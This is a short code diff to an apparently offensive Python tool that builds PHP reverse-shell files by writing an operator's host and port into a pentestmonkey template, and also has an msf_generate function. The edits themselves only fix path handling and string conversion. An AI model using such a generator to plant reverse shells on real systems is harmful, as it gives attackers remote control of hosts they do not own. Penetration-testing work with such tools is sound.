@@ -41,14 +41,14 @@ def msf_generate(payload):
 
 def php_file_pentestmonkey(payload=None):
     filename = "php-reverse-shell.php"
-    dir = os.getcwd()
+    dir = getcwd()
     fin = open(dir + "/php-reverse-shell-template.php")
     fout = open(filename, "wt")
     for line in fin:
         if '127.0.0.1' in line:
-            fout.write(line.replace('127.0.0.1', args.host))
+            fout.write(line.replace('127.0.0.1', str(args.host)))
         elif '1234' in line:
-            fout.write(line.replace('1234', args.port))
+            fout.write(line.replace('1234', str(args.port)))
         else:
             fout.write(line)
     fin.close()
@@ -147,10 +147,14 @@ def show_ips():
     print("\n".join(": ".join(_) for _ in sorted(my_ips.items())))
 
 
+def getcwd():
+    return os.path.dirname(os.path.realpath(__file__))
+
+
 def main_menu(clear=True, items=None):
     if clear is True:
         cls()
-    print("Working Directory is {dir},\n".format(dir=os.getcwd()))
+    print("Working Directory is {dir},\n".format(dir=getcwd()))
     print("What code are you looking for?")
     for index, value in enumerate(items):
         print(str(index) + ": " + value['title'])
